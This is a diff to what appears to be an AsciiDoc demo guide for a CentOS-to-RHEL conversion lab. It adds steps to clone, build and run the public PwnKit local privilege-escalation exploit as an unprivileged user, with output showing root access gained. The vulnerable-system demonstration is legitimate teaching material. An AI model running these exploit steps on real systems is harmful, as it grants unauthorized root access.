@@ -66,22 +66,35 @@ The flow is
 # Login as our developer user
 ssh developer@leapp2rhel
 
+# Clone the Git Repo
+git clone https://github.com/luijait/PwnKit-Exploit.git Exploit
+
+# Build the PwnKit Exploit
+cd Exploit
+make
+
+# Confirm we can't access the root user
+
 sudo -i
 # Should produce a response similar to
-[sudo] password for developer:
-developer is not in the sudoers file.
-This incident will be reported.
+[sudo] password for developer: 
+developer is not in the sudoers file.  This incident will be reported.
 
-./exploit
+
+# Now run our exploit
+
+./exploit 
 Current User before execute exploit
 hacker@victim$whoami: developer
-Exploit written by @luijait (0x6c75696a616974)mkdir: cannot create directory
-‘GCONV_PATH=.’: File exists
-mkdir: cannot create directory ‘tmp’: File exists
+Exploit written by @luijait (0x6c75696a616974)
 [+] Enjoy your root if exploit was completed succesfully
-[root@centos8 developer]# id
-uid=0(root) gid=0(root) groups=0(root),1001(developer)
-context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+[root@localhost PwnKit-Exploit]# id
+uid=0(root) gid=0(root) groups=0(root),1001(developer) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+exit
+logout
+
 ----
 
 Convert link:Demo_Convert2RHEL.adoc[Centos environment to RHEL] with Convert2RHEL
